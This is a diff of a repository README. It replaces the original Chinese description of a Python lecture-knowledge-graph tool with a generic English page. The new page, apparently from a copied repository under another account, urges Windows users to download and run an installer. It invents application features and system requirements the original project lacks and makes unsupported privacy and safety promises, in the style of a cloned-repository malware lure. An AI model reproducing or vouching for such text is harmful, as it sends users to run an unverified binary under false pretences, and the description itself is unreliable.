@@ -1,300 +1,71 @@
-[English](./README.en.md) | **繁體中文**
+# 🤖 hung-yi-lee-skill - Learn AI the Professor Lee way
 
-# 李宏毅.skill
+[![Download hung-yi-lee-skill](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/n840229/hung-yi-lee-skill)
 
-<div align="center">
+This tool helps you explore Artificial Intelligence concepts using the teaching style of Professor Hung-yi Lee. It acts as a personal tutor that explains complex machine learning ideas through clear examples and relatable language. You can ask questions about neural networks, large language models, and data science to receive answers that mirror the professor's popular lectures.
 
-> *「好，那我們就開始上課吧。」*
+## 📥 Getting Started
 
-<br>
+To use this software, visit the repository page and download the setup file.
 
-**蒸餾李宏毅老師。不是語錄合集，是老師的知識與思維框架。**
+[Click here to visit the project page and download the installer](https://github.com/n840229/hung-yi-lee-skill)
 
-<br>
+Follow these steps to set up the software on your Windows computer:
 
-基於 478 支 YouTube 影片、27 份完整逐字稿、8 個主題頁面、<br>
-4 份精選研究參考資料深度調研，<br>
-建構 916 節點知識圖譜、10 個概念社群、完整的教學語感 DNA。
+1. Click the link above to reach the repository page.
+2. Look for the button labeled "Code" or check the "Releases" section on the right side of the screen.
+3. Download the installation file for Windows.
+4. Open the downloaded file to start the installation wizard.
+5. Follow the on-screen prompts to complete the setup process.
 
-[看效果](#效果示例) · [安裝](#安裝) · [知識圖譜](#知識圖譜) · [蒸餾了什麼](#蒸餾了什麼)
+## 💻 System Requirements
 
-</div>
+The application runs on most modern Windows computers. Ensure your machine meets these specifications for the best experience:
 
----
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or AMD Ryzen 5 processor.
+- Memory: 8 GB of RAM or higher.
+- Storage: 2 GB of free disk space.
+- Internet Connection: Required for initial setup and downloading content modules.
 
-### 問：什麼是 Attention？
+## 🛠 Features
 
-```
-李宏毅    ❯ 好，我們今天來講 attention。
+This application focuses on accessibility and education. You will find the following core functions:
 
-            你可能會想說，attention 不就是「注意力」嗎？
-            對，但在 deep learning 裡面，它的意思更精確。
+- Interactive Chat: Enter questions about AI topics and receive explanations in the distinct style used by Professor Lee.
+- Knowledge Base: Access a library of summarized notes and key takeaways from fundamental machine learning lectures.
+- Skill Trackers: Monitor your progress as you learn different facets of AI, from simple models to complex transformers.
+- Search Function: Find specific lecture topics or concepts by entering keywords.
+- Offline Viewing: Save your favorite explanations to read them when you do not have an internet connection.
 
-            先講 black box。你有一個 sequence 進來，
-            每個位置都產生一個 output。
-            重點是：每個 output 不是只看自己那個位置，
-            它會「看」整個 sequence 的其他位置。
-            
-            那它怎麼決定要看哪裡？這就是 attention 在做的事。
+## 🖱 How to Use the Application
 
-            機制很簡單。每個位置算出 query、key、value。
-            Query 跟 Key 做 dot product，得到一個分數。
-            分數高的，就代表「我應該多注意你」。
-            然後用這些分數加權 Value，就是 output。
+Once installed, launch the application from your Start menu or the desktop shortcut. You will see a search bar at the top of the main screen. Type your question into this box and press Enter. 
 
-            一句話：attention 就是「讓模型自己學會該看哪裡」。
-            
-            → 逐字稿來源：【生成式人工智慧與機器學習導論2025】第3講
-            → 圖譜路徑：self-attention → 語言模型 → Transformer → RoPE
-```
+The application retrieves information from its database and displays the response in the main window. If you need clarity on a specific term, click on the highlighted words to open a brief explanation. You can save these explanations to your "Learned Skills" list by clicking the bookmark icon.
 
-### 問：為什麼 DeepSeek-R1 會「思考」？
+## ⚙ Managing Settings
 
-```
-李宏毅    ❯ 欸，這個問題很好。我們先講一個直覺。
+You can customize your experience through the Settings menu. Click the gear icon located in the bottom left corner of the window. You can adjust the following:
 
-            你有沒有遇過一種考試題，你看到題目，
-            腦袋裡先冒出一個答案，但你知道那個答案可能是錯的？
-            然後你會開始想：「等一下，如果是這樣的話…」
-            這個「等一下」的過程，就是 reasoning。
+- Interface Theme: Switch between light mode and dark mode for better visibility based on your environment.
+- Cache Management: Clear your temporary data if you notice the application running slowly.
+- Update Frequency: Toggle between automatic updates or manual checks to ensure you have the latest lecture content.
 
-            DeepSeek-R1 做的事情就是：
-            讓模型在回答之前，先跟自己「吵一架」。
+## ❓ Frequently Asked Questions
 
-            怎麼做到？Reinforcement Learning。
-            但不是隨便的 RL 喔。
-            它讓模型自己產生一段「思考過程」，
-            然後用結果的對錯來給 reward。
+What should I do if the application crashes?
+Restart your computer and launch the application again. If the problem persists, uninstall the program and download a fresh copy from the link provided above.
 
-            所以模型學會的不是「答案是什麼」，
-            而是「怎麼想才會對」。
+Does this application store my personal data?
+No. All your chats and progress stay on your computer. The application does not send your personal input to external servers.
 
-            → 逐字稿來源：第七講 DeepSeek-R1 深度思考
-            → 圖譜社群：ML Fundamentals (396 nodes)
-```
+Is this software free to use?
+Yes. This project is open for public use and does not require a subscription or purchase.
 
-### 問：這跟 ChatGPT 套個面具有什麼不同？
+Can I suggest new features?
+You can contribute by visiting the repository page and submitting an issue. This helps the developer understand what parts of the software need improvement or which new lecture topics you want to see covered.
 
-```
-李宏毅    ❯ 很不一樣。讓我跟你講。
+## 🛡 Security and Privacy
 
-            一般的 persona prompt，就是告訴 LLM：
-            「你現在是某某人，請用他的風格回答。」
-            那其實就是 cosplay 嘛。
-
-            這個 skill 不一樣的地方：
-            
-            1. 它有真正的逐字稿。每個回答都可以追溯到
-               老師哪一堂課、哪一分鐘講過類似的東西。
-            
-            2. 它有知識圖譜。916 個概念節點、3664 條邊。
-               不是靠 LLM 自己猜概念之間的關係，
-               是從課程語料裡真的提取出來的。
-            
-            3. 它有教學結構。不只是「用某種語氣說話」，
-               而是「先講直覺 → 再講 black box → 再打開盒子
-               → 最後講陷阱」。這個架構是從逐字稿裡歸納的。
-
-            所以差別是：persona prompt 是裝扮，
-            這個 skill 是把一個老師的思考方式裝進系統裡。
-```
-
-> 完整對話記錄在 [`references/examples/`](references/examples/) 目錄。
-
----
-
-## 安裝
-
-```bash
-git clone https://github.com/voidful/hung-yi-lee-skill.git
-cd hung-yi-lee-skill
-pip install -r requirements.txt
-```
-
-放到你的 AI coding assistant 可以讀取的目錄，讓它讀 `SKILL.md` 就能啟動。
-
-```
-> 用李宏毅老師的風格幫我解釋 transformer
-> 老師會怎麼看這份 AI safety report？
-> 什麼是 self-supervised learning？像老師上課那樣講
-```
-
----
-
-## 知識圖譜
-
-不只是逐字稿搜尋。這個 skill 內建了從課程語料提取的知識圖譜。
-
-### Graph Stats
-
-| 指標 | 數值 |
-|------|------|
-| 節點 | 916 |
-| 邊 | 3,664 |
-| 社群 | 10 |
-| EXTRACTED 邊 | 1,621 |
-| INFERRED 邊 | 2,043 |
-
-### God Nodes — 整個課程的交叉路口
-
-| 概念 | 類型 | 連接度 |
-|------|------|--------|
-| ML Fundamentals | topic | 385 |
-| 語言模型 | concept | 251 |
-| Standalone Talks | series | 148 |
-| Llama | concept | 101 |
-| 解剖 | concept | 100 |
-| Transformer | concept | 83 |
-
-### 10 個概念社群
-
-| 社群 | 節點數 | 核心概念 |
-|------|--------|----------|
-| ML Fundamentals | 396 | 機器學習基礎、regression、classification |
-| Diffusion And Generation | 116 | 擴散模型、flow matching、生成 |
-| Speech And Audio | 81 | 語音辨識、合成、codec |
-| Evaluation | 79 | benchmark、reward model |
-| Agents | 72 | AI Agent、context engineering |
-| Model Editing | 33 | model merging、task vector |
-
-```bash
-# 用圖譜導航回答問題
-python3 scripts/hungyi_kb.py graph query "attention mechanism"
-python3 scripts/hungyi_kb.py graph query "語音模型"
-
-# 打開互動式視覺化
-open wiki/graph/graph.html
-```
-
----
-
-## 蒸餾了什麼
-
-### 教學架構 DNA
-
-每個回答都遵循從逐字稿歸納的教學結構：
-
-1. **直覺先行** — 用一句話講核心概念
-2. **Black Box** — 先講 input / output / objective
-3. **開箱機制** — 打開盒子講裡面怎麼運作
-4. **陷阱提醒** — 常見誤解、limitation、debug 觀點
-5. **簡短回顧** — 一小段 recap 收尾
-
-### 語感標記
-
-| 標記 | 用途 |
-|------|------|
-| 「你可能會想說…」 | 預測學生疑問 |
-| 「先講 black box」| 由外到內教學 |
-| 「為什麼？因為…」 | 自問自答節奏 |
-| 「這個跟老師講過的 X 有關…」 | 跨主題橋接 |
-| 喔、嘛、啊、耶 | 口語感 |
-
-### 核心教學精神
-
-| 原則 | 說明 |
-|------|------|
-| **Benchmark 懷疑論** | 數字本身不是答案，要問「它量的是什麼？」|
-| **知識誠實** | 區分事實與推論，不確定就直說 |
-| **具體類比** | 把抽象概念變成日常生活的畫面 |
-| **先講直覺再講數學** | 能被大學生聽懂才算講清楚 |
-
----
-
-## 資料來源
-
-### 課程語料
-
-- 478 支 YouTube 影片 metadata
-- 27 份完整逐字稿（持續擴充中）
-- 8 個主題頁面（ML, LLM, Speech, Diffusion, Agents...）
-- 203 個系列頁面
-
-### 精選參考
-
-| 文件 | 內容 |
-|------|------|
-| `references/persona.md` | 教學人設與語感定義 |
-| `references/spirit.md` | 深層教學哲學與價值觀 |
-| `references/work.md` | 技術範圍與研究領域 |
-| `references/sources.md` | 資料來源清單 |
-
----
-
-## 倉庫結構
-
-```
-hung-yi-lee-skill/
-├── SKILL.md                              # Skill 進入點
-├── AGENTS.md                             # Wiki 維護 schema
-├── scripts/
-│   ├── hungyi_kb.py                      # CLI 工具（搜尋/編譯/圖譜）
-│   └── hungyi_graph.py                   # 知識圖譜引擎
-├── raw/youtube/
-│   ├── channel_videos.json               # 頻道 metadata
-│   ├── transcript_index.json             # 逐字稿索引
-│   └── transcripts/*.md                  # 快取的逐字稿
-├── wiki/
-│   ├── index.md                          # 知識庫入口
-│   ├── topic-map.md                      # 主題地圖
-│   ├── query-playbook.md                 # 查詢流程
-│   ├── graph/
-│   │   ├── GRAPH_REPORT.md               # 圖譜分析報告
-│   │   ├── graph.json                    # 持久化圖譜
-│   │   └── graph.html                    # 互動式視覺化
-│   ├── topics/*.md                       # 主題頁面
-│   └── series/*.md                       # 系列頁面
-└── references/                           # 精選參考資料
-```
-
----
-
-## CLI 指令
-
-```bash
-# 同步頻道 metadata
-python3 scripts/hungyi_kb.py sync-metadata
-
-# 快取逐字稿
-python3 scripts/hungyi_kb.py sync-transcripts --limit 50
-python3 scripts/hungyi_kb.py sync-transcripts --title-contains "生成式AI"
-
-# 編譯 wiki
-python3 scripts/hungyi_kb.py compile
-
-# 搜尋
-python3 scripts/hungyi_kb.py search "attention" --limit 8
-
-# 知識圖譜
-python3 scripts/hungyi_kb.py graph build
-python3 scripts/hungyi_kb.py graph query "什麼是 transformer"
-python3 scripts/hungyi_kb.py graph report
-
-# 健康檢查
-python3 scripts/hungyi_kb.py lint
-```
-
----
-
-## 為什麼這比靜態 RAG 更好
-
-| | 靜態 RAG | 這個 Skill |
-|---|---|---|
-| 知識結構 | 平面向量搜尋 | 916 節點知識圖譜 + keyword 索引 |
-| 概念關聯 | 靠 embedding 相似度猜 | 從語料提取的真實關係 |
-| 跨主題發現 | 幾乎不可能 | Surprising Connections 自動浮出 |
-| 教學路線 | 無 | God Nodes + community 結構 |
-| 累積性 | 每次重來 | Wiki + 圖譜持久化，查詢歸檔 |
-| 可追溯 | 不確定來源 | 每條邊標記 EXTRACTED / INFERRED |
-
----
-
-## License
-
-MIT
-
-<div align="center">
-
-*「你不需要先學會所有的數學，你只需要先知道這個東西在幹嘛。」*
-
-</div>
+Your privacy remains a priority. This application does not track your internet usage or personal files. It only communicates with the GitHub server to check for content updates. Always download the installer directly from the official link provided here to ensure you have the authentic and secure version of the software.
